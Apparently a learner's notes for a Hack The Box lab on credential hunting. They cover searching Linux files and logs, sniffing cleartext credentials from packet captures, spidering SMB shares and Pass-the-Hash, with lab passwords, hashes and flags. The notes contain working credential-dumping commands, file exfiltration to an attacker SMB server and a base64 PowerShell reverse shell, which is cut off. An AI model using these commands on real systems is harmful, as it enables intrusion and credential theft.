### 1. Files - the biggest category:

- Config files (`.conf`, `.config`, `.cnf`): Often contain plaintext creds; MySQL configs are classic targets.
- Databases (`.sql`, `.db`, etc.)
- Notes: tricky, since they can have anyname or no extension (search `.txt` and extensionless files)
- Scripts (`.py`, `.sh`, `.pl`, etc.): Frequently hardcode creds for automation
- Cronjobs (`/etc/crontab`, `/etc/cron.d`, `cron.{daily,hourly,weekly,monthly}`): Creds sometimes wrongly stored here
- SSH keys



### 2. History

- `.bash_history`, `.bashrc`, `.bash_profile`: Commands sometimes include passwords typed inline (the example shows a password leaked in bash history)
- Log files in `/var/log/` -- key ones: `auth.log`/`secure` (auth), `syslog`/`messages` (system), `cron`, `mysqld.log`. Grep for `accepted`, `failed`, `sudo`, `password changed`, etc.



### 3. Memory / Cache

- mimipenguin: Pulls creds from memory (needs root)
- LaZagne - broader; extracts from browsers, SSH, keyrings, shadow, Docker, KeePass, WiFi, etc.



### 4. Key-rings - OS-based encrypted password storage (master-password protected)



## Browser Credentials

Firefox stores encrypted creds in `logins.json` inside the profile folder (`.mozilla/firefox/*.default-release/`). Encryption != safety:

- Firefox Decrypt (needs Python 3.9) decrypts them
- LaZagne (`browsers` module) ins the alternative



## Key Takeaways

The whole module boils down to a search methodology: enumerate systematically by category rather than guessing. The `for` loops that iterate over extension lists and pipe through `grep -v` to filter noise (`lib`, `share`, `doc`, `fonts`) are the reusable pattern worth saving. They generalize to almost any file-hunt scenario.

## Commands



### Config files (`.conf`, `.config`, `.cnf`)

Find all config files (filtering noise):

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Grep configs directly for creds:

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```



### Databases (`.sql`, `.db`, etc.)

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```



### Notes (`.txt` + extensionless files)

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```



### Scripts (`.py`, `.pyc`, `.pl`, `.go`, `.jar`, `.c`, `.sh`)

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```



### Cronjobs

```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

System-wide: `/etc/crontab`, `/etc/cron.d/` (Debian). Time-based dirs: `cron.{hourly,daily,weekly,monthly}`.

## History



### Bash history & profile files

```bash
tail -n5 /home/*/.bash*
```

Check `.bash_history`, `.bashrc`, `.bash_profile` — passwords sometimes typed inline.

### Log files

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

**Key log files:**


| File                                                    | Description             |
| ------------------------------------------------------- | ----------------------- |
| `/var/log/messages`, `/var/log/syslog`                  | Generic system activity |
| `/var/log/auth.log` (Debian) / `/var/log/secure` (RHEL) | Authentication          |
| `/var/log/faillog`                                      | Failed logins           |
| `/var/log/cron`                                         | Cron jobs               |
| `/var/log/mail.log`                                     | Mail server             |
| `/var/log/httpd`                                        | Apache                  |
| `/var/log/mysqld.log`                                   | MySQL                   |




## Memory & Cache



### mimipenguin (needs root)

```bash
sudo python3 mimipenguin.py
```



### LaZagne (broader coverage)

```bash
sudo python2.7 laZagne.py all      # everything
python3 laZagne.py browsers        # browsers only
```

Sources: WiFi, wpa_supplicant, libsecret, kwallet, Chromium, Mozilla, Thunderbird, Git, ENV vars, Grub, Fstab, AWS, Filezilla, SSH, Apache, shadow, Docker, KeePass, keyrings, sessions.

## Browser credentials (Firefox)

Locate profile:

```bash
ls -l .mozilla/firefox/ | grep default
```

Encrypted creds live in `logins.json`:

```bash
cat .mozilla/firefox/<profile>.default-release/logins.json | jq .
```

Decrypt with **Firefox Decrypt** (needs Python 3.9; use v0.7.0 for Python 2):

```bash
python3.9 firefox_decrypt.py
```

Or via LaZagne (`browsers` module above).

## Connect to HTB



#### Examine the target and find out the password of the user Will. Then, submit the password as the answer.

On Ubuntu

```bash
mkdir ~/firefox_loot

source venv/bin/activate
sudo $(which smbserver.py) -smb2support CompData /home/mapacheroja22/
```

On Server

```bash
smbclient //10.10.17.216/CompData -c "put cert9.db"
```

On Ubuntu

```bash
mv ~/key4.db ~/logins.json ~/cert9.db ~/firefox_loot/ 2>/dev/null

sudo chown mapacheroja22:mapacheroja22 ~/cert9.db
mv ~/cert9.db ~/firefox_loot/
python3 firefox_decrypt/firefox_decrypt.py ~/firefox_loot/

Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```



# Credential Hunting in Network Traffic

When traffic isn't encrypted (legacy systems, misconfigured services, test apps running plain HTTP) credentials travel in cleartext and can be sniffed. The section covers finding those creds in captures/live traffic with Wireshark and Pcredz.

## Plaintext vs Encrypted Protocols

Every common protocol has a secure counterpart; the plaintext version is what you hunt in:

- `HTTP -> HTTPS`
- `FTP -> FTPS/SFTP`
- `SNMP -> SNMPv3`
- `POP3 -> POP3S`
- `IMAP -> IMAPS`
- `SMTP -> SMTPS`
- `LDAP -> LDAPS`
- `RDP` (-> TLS)
- `DNS -> DoH`
- `SMB -> SMB 3.0/TLS`
- `VNC -> VNC+TLS`



## Wireshark



### Useful display filters


| Filter                                            | Purpose                                      |
| ------------------------------------------------- | -------------------------------------------- |
| `ip.addr == 56.48.210.13`                         | Specific IP                                  |
| `tcp.port == 80`                                  | By port                                      |
| `http`                                            | HTTP traffic                                 |
| `dns`                                             | DNS traffic                                  |
| `tcp.flags.syn == 1 && tcp.flags.ack == 0`        | SYN packets (scans/connection attempts)      |
| `icmp`                                            | Ping / recon                                 |
| `http.request.method == "POST"`                   | POST requests — often carry login form creds |
| `tcp.stream eq 53`                                | Follow one TCP conversation                  |
| `eth.addr == 00:11:22:33:44:55`                   | By MAC                                       |
| `ip.src == 192.168.24.3 && ip.dst == 56.48.210.3` | Traffic between two hosts                    |




### Searching packet contents for string

- Display filter: `http contains "passw"`
- Or Edit > Find Packet, enter a search string like `passw`



## Pcredz

Auto-extracts creds from a pcap or live interface. Pulls: credit card numbers, POP/SMTP/IMAP creds, SNMP community string, FTP creds, HTTP NTLM/Basic + form creds, NTLMv1/v2 hashes (DCE-RPC, SMBv1/2, LDAP, MSSQL, HTTP), and Kerberos AS-REQ (etype 23) hashes.

Run against a capture file: 

```bash
./Pcredz -f demo.pcapng -t -v
```

`-f`=file, `-t`=TCPDump format handling, `-v`=verbose. In the sample output it caught an SNMPv2 community string and FTP User/Pass in seconds.

## Connect to HTB



#### The packet capture contains cleartext credit card information. What is the number that was transmitted?

```bash
git clone https://github.com/lgandx/PCredz.git

source venv/bin/activate
pip3 install pcapy-ng

cd PCredz
./Pcredz -f ../Desktop/demo.pcapng -t -v

Author: Laurent Gaffie
Contact: lgaffie@secorizon.com
X: @secorizon

CC number scanning activated

Parsing ../Desktop/demo.pcapng...
[2026-07-22 10:14:06.569223] 192.168.31.243:55692 > 192.168.31.238:80
Potential password submission:
Request: username=jbenito&password=Password987%21

[2026-07-22 10:14:06.998893] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999046] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999100] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999152] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999193] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999231] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999285] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999341] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999394] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999450] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999507] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999563] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999618] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999691] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999763] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999842] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999919] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:06.999989] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000061] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000132] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000206] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000277] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000349] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000423] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000497] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000569] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000641] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000692] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000763] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000836] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000906] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.000976] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001050] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001127] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001198] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001269] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001344] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001413] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001493] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001562] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001639] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001705] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001775] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001853] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001919] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.001976] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002032] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002093] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002149] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002209] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002264] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002324] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002379] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002442] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002496] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002554] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002624] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002676] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002722] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002775] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002823] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002880] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002941] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.002981] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003023] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003063] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003110] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003150] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003189] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003228] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003267] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003307] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003345] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003385] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003423] 192.168.31.211:59022 > 192.168.31.238:161
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.003462] 192.168.31.238:161 > 192.168.31.211:59022
Found SNMPv2c Community string: s3cr3tSNMPC0mmun1ty

[2026-07-22 10:14:07.024718] 192.168.31.243:55707 > 192.168.31.211:21
FTP User: leah

[2026-07-22 10:14:07.025457] 192.168.31.243:55707 > 192.168.31.211:21
FTP Pass: qwerty123

# Inside of Wireshark:
http.request.method == "POST"
5156 8829 4478 9834

```



#### What is the SNMPv2 community string that was used?

```bash
s3cr3tSNMPC0mmun1ty
```



#### What is the password of the user who logged into FTP?

```bash
qwerty123
```



#### What file did the user download over FTP?

```bash
# In Wireshark
ftp

10756	82.739862760	192.168.31.243	192.168.31.211	FTP	70	Request: RETR creds.txt
```



# Credential Hunting in Network Shares

Corporate SMB shares are a gold mine: employees leave plaintext creds, config files, and secrets lying around. This section covers automating the hunt from both Windows and Linux. 

## What to Look For

- Keywords in files: `passw`, `user`, `token`, `key`, `secret`
- Extensions: `.ini`, `.cfg`, `.env`, `.xlsx`, `.ps1`, `.bat`
- Interesting filenames: containing `config`, `user`, `passw`, `cred`, `initial`
- Domain-specific: search for `INLANEFREIGHT\` to catch domain-qualified references
- Localize keywords to the target (German company -> `Benutzer`, not `User`)
- Be strategic: IT shares > company-photo shares. Scanning thousands of files across ten shares eats time.

Start simple before scaling up:

```powershell
Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...
```



## Hunting from Windows



### Snaffler

C# tool, run on a domain.joined machine; auto-finds readable shares and flags interesting files (color-coded by severity: `{Red}` = highest interest, e.g. the `unattend.xml` with an AdministratorPassword it caught):

```cmd
Snaffler.exe -s
```

Useful flags: `-u` (pull AD users and search for references to them), `-i`/`-n` (include/specify which shares to scan). Expect false positives, manual review needed.

### PowerHuntShares

PowerShell, doesn't need a domain-joined machine, generates an HTML report with a severity-ranked UI:

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

Enumerates computes -> checks 445 -> maps shares + permissions -> flags excessive-privilege/high-risk shares -> builds HTML + CSV output

## Hunting from Linux



### MANSPIDER

Scans SMB shares remotely; run via Docker to dodge dependency issues

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```

`-c` = content string, `-u`/`-p` = creds. Matches download to `.manspider/loot`.

### NetExec (`nxc`)

`--spider` searches shares by content

```bash
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```

`--spider IT` = target the IT share, `--content` = search inside files, `--pattern` = the string.

## Connect to HTB



#### One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

```bash
sudo $(which smbserver.py) -smb2support -username mendres -password 'Inlanefreight2025!' CompData /home/mapacheroja22/

xfreerdp /v:10.129.234.173 /u:mendres /p:Inlanefreight2025!
```

```pwsh
cd ..
cd Public
Snaffler.exe -s

net use \\10.10.17.216\CompData /user:mendres 'Inlanefreight2025!'
copy C:\Users\Public\snaffler.log \\10.10.17.216\CompData\

                                                                                                                        PS C:\Users\Public\PowerHuntShares> Get-ChildItem -Recurse -Include *.* \\DC01.inlanefreight.local\IT -ErrorAction SilentlyContinue | Select-String -Pattern "INLANEFREIGHT\\" -ErrorAction SilentlyContinue
\\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt:5: # Auth backup password: INLANEFREIGHT\jbader:ILovePower333###                                                                                         

```

```powershell
nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"
```

```bash
smbclient //10.129.234.173/HR -U jbader%'ILovePower333###' -c 'get Confidential\Onboarding_Docs_132.txt'

cat Confidential\\Onboarding_Docs_132.txt
Account credentials
**Username:** `Administrator`  
**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`  
```



# Pass the Hash (PtH)

It is a technique where you authenticate using an NTLM password hash directly, without ever cracking it to plaintext. It works because NTLM hashes are unsalted and stay static until the password changes, so the hash itself is a valid credential.

## Prerequisites and how hashes are obtained

You need administrative or specific privileges on the target first. Hashes come from dumping the local SAM database, extracting from `ntds.dit` on a Domain Controller, or pulling from LSASS memory. 

## Windows tools

Mimikatz uses the `sekurlsa::pth` module to spawn a process (default `cmd.exe`) in the impersonated user's context, taking `/user`, `/rc4` (or `/NTLM`), `/domain`, and `/run`. Invoke-TheHash is a PowerShell collection doing PtH over SMB (`Invoke-SMBExec`) or WMI (`Invoke-WMIExec`) via .NET TCPClient and NTLMv2. You don't need local admin client-side, but the account/hash must have admin rights on the target. Examples include creating a new admin user and delivering a base64 PowerShell reverse shell.

## Linux tools

Impacket's `psexec` (plus `wmiexec`, `atexec`, `smbexec`) runs commands with `-hashes :NTLM`. NetExec authenticates across whole subnets to find where a hash grants local admin (`Pwn3d!`), useful for spotting local admin password reuse -- with `--local-auth` and `-x` for command execution. The real-world fix recommended here is deploying LAPS. Evil-WinRM (`-H` flag) is the fallback over WinRM/PowerShell remoting when SMB is blocked. Xfreerdp (`/pth`) gives GUI access but requires Restricted Admin Mode enabled via the `DisableRestrictedAdmin` registry key.

## The UAC caveat (worth understanding, not just memorizing)

`LocalAccountTokenFilterPolicy` = 0 means only the RID-500 built-in Administrator can do remote admin; setting it to 1 allows other local admins. Exception: if `FilterAdministratorToken` = 1, even RID-500 gets caight by UAC and remote PtH fails. Critically, these restrictions only apply to local accounts. Domain accounts with admin rights bypass the whole problem.

## Commands



### Windows: Mimikatz

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTLM_HASH> /domain:inlanefreight.htb /run:cmd.exe" exit
```



### Windows: Invoke-TheHash (SMB/WMI)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <IP> -Domain <domain> -Username julio -Hash <NTLM_HASH> -Command "<cmd>" -Verbose
Invoke-WMIExec -Target <host> -Domain <domain> -Username julio -Hash <NTLM_HASH> -Command "<cmd>"
```



### Linux: Impacket

```bash
impacket-psexec administrator@<IP> -hashes :<NTLM_HASH>
```

(same syntax works with impacket-wmiexec, impacket-atexec, impacket-smbexec)

### Linux: NetExec

```bash
netexec smb <IP/CIDR> -u Administrator -d . -H <NTLM_HASH>          # spray / check for Pwn3d!
netexec smb <IP> -u Administrator -d . -H <NTLM_HASH> -x whoami     # command exec
```

Add `--local-auth` for local-account authentication across a subnet.

### Linux: Evil-WinRM

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```



### Linux: RDP (xfreerdp)

```bash
xfreerdp /v:<IP> /u:julio /pth:<NTLM_HASH>
```

Requires Restricted Admin Mode on the target first:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```



## Connect to HTB



#### Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

```bash
evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

cd ..
cd ..
cd ..
dir

more pth.txt
G3t_4CCE$$_V1@_PTH
```



#### Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
```

DisableRestrictedAdmin

#### Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

```cmd
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
```



#### Using David's hash, perform a Pass the Hash attack to connect to the shared folder DC01\david and read the file david.txt.

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit

dir \\DC01\david\
type \\DC01\david\david.txt
D3V1d_Fl5g_is_Her3
```



#### Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder DC01\julio and read the file julio.txt.

```bash
64f12cddaa88057e06a81b54e73b949b 

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit

type \\DC01\julio\julio.txt
JuL1()_SH@re_fl@g
```



#### Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:powershell.exe" exit

# On one terminal
c:\tools\nc.exe -lvnp 8001

```

```pwsh
# Go to revshells.com and generate the payload with the IP and port, and pick PowerShell #3 (Base64)

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAyADkALgAyADAANAAuADIAMwAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4A